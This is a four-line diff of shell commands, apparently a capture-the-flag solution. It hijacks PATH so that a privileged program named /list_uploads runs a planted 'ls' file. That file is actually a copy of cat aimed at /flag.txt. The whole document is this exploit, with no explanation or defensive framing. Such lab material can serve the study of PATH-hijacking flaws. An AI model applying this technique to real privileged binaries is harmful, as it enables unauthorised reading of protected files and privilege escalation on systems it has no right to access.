@@ -1,0 +1,4 @@
+cp /bin/ls /abyss/id/ls
+cp /bin/cat /abyss/id/cat
+echo "/abyss/id/cat /flag.txt" > /abyss/id/ls
+PATH=/abyss/id; /list_uploads
